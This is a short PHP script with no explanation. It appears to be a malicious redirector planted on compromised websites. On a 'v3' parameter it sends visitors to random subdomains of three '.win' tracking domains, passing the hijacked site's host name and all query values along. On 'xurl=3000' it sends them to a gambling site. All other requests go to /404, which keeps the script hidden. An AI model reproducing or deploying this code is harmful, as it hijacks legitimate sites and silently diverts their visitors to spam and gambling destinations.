<?php
if (isset($_GET['v3']) && $_GET['v3'] !== '') {
    $domains = [
        'usrclicklink.win', 'usrredirecmetto.win', 'usrtrcklnk.win'
    ];
    
    $uniqw = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, 8);
    $randomDomain = $domains[array_rand($domains)];
    
    $baseURL = "https://{$uniqw}.{$randomDomain}?v1=" . urlencode($_SERVER['HTTP_HOST']);
    $queryString = http_build_query($_GET);
    $redirectURL = $baseURL . '&' . $queryString;

    header("Location: {$redirectURL}", true, 302);
    exit;

} elseif (isset($_GET['xurl']) && $_GET['xurl'] !== '') {
    
    if ($_GET['xurl'] == '3000') {
        $baseURL = "https://compass-gambling.com?v4=" . urlencode($_SERVER['HTTP_HOST']);
        $queryString = http_build_query($_GET);
        $redirectURL = $baseURL . '&' . $queryString;

        header("Location: {$redirectURL}", true, 302);
    } else {
        header("Location: /404", true, 302);
    }
    exit;

} else {
    header("Location: /404", true, 302);
    exit;
}
?>
